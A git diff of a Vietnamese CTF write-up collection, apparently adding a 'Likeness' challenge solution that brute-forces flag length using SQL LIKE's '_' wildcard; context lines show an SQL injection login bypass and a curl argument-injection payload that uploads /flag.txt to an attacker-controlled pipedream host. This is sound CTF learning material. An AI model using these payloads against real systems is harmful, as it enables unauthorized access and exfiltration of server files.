@@ -26,6 +26,7 @@
 - [Brute-force Basic Authentication](#brute-force-basic-authentication)
 - [Neonify](#neonify)
 - [Baby Crawler](#baby-crawler)
+- [Likeness](#likeness)
 ## Baby Address Note
 
 1. Dựa vào source code biết được bài này là sql injection. Với câu truy vấn `f"SELECT * FROM users WHERE uid='{uid}';"` ta có thể bypass bằng `' OR '1'='1' --`
@@ -301,5 +302,22 @@ end
 4. Như vậy phải tìm cách injection thẳng vào command curl. Được biết curl có một option -F cho phép gửi file trong http request. Ta sẽ craft một payload để curl gửi file chứa flag tới 1 host mà ta kiếm soát.
 `http://103.97.125.53:30244/ -F file=@/flag.txt https://eoxgnbd07mhnjeq.m.pipedream.net`
 5. Trên pipedream ta có thể băt được request chứa url tới file được gửi từ phía server. Mở ra thì lấy được flag.
+
+## Likeness
+
+1. Bài này cho ta biết ở `/source` có chứa source code.
+2. Đọc qua source, ta có thể nhận ra một vài điều.
+- `@limiter.limit("5/second")`: Giới hạn số request đến server
+- `res = cur.execute("SELECT * from authors where last LIKE ?", (request.args['lastname'].replace("%", ""),))`: xử lý tham số đầu vào và thực hiện câu query truy xuất csdl. Đặc biệt là ở đây sử dụng `?` để replace nên không thể chèn dấu "". Ngoài ra cũng loại bỏ ký tự `%`.
+- Và một đoạn insert các record vào db trong đó record cuối có chứa flag.
+3. Nhận thấy trong LIKE operator có 2 wildcards là `%` và `_` thì dấu `_` chưa bị filter. `_` trong LIKE SQL dùng để thay thế cho một ký tự trong string đó.
+4. Ta có thể sử dụng nó để brute-force số ký tự của flag. với format flag.
+5. Trước tiên generate các payload bằng.
+```
+for i in range(1, 101):
+    print("CHH{{}".format("_" * i)+"}")
+```
+6. Khi truy xuất đúng record. ta sẽ nhận được flag.
+![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/819b0e17-b780-47f0-84fe-bb3d9eb0927e)
 
 ## 
